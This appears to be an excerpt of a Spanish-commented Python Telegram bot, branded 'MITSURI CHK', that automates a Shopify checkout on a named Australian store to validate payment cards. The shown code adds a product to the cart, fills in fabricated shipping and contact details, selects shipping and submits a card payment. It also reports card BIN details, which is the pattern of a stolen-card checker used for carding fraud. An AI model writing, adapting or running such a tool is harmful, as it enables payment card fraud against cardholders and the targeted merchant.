...
@Client.on_message(filters.command("mo", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ
ESTADO: <code>ON</code>
GATEWAY: <code>MORFEO</code>
PASARELA: <code>SHOPIFY + PZ $34.90</code></b>""")
...
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '44280991449262'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.trueprotein.com.au/cart/add', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.trueprotein.com.au/checkout/")
        ...
        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Battributes%5D%5BDelivery+Instructions%5D=&checkout%5Battributes%5D%5BBrowser%5D=Chrome+120&checkout%5Battributes%5D%5BBrowser%5D=Chrome+120&checkout%5Bemail%5D=jdksjdksjdjkss%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=PEPE+&checkout%5Bshipping_address%5D%5Blast_name%5D=PEREZ&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=9701+New+York+Ct&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Clovis&checkout%5Bshipping_address%5D%5Bprovince%5D=NM&checkout%5Bshipping_address%5D%5Bzip%5D=88101&checkout%5Bshipping_address%5D%5Bphone%5D=%28712%29+291-0111&checkout%5Bclient_details%5D%5Bbrowser_width%5D=769&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'

        req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
        time.sleep(3)
        
        #-----------PASO N° 5 REEMPLAZAR PAYLOAD #3-----------#
        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-US%2520Flat%2520Rate%2520Shipping-20.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=769&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.trueprotein.com.au"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=77381238958&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B17122910111&checkout%5Btotal_price%5D=2500&checkout_submitted_request_url=https%3A%2F%2Fwww.trueprotein.com.au%2F8903098448%2Fcheckouts%2F6e13c67cc676d04171e18f974f084079&checkout_submitted_page_id=1941e4f8-AEDF-43B2-06AF-C8FC243C630F&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=769&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
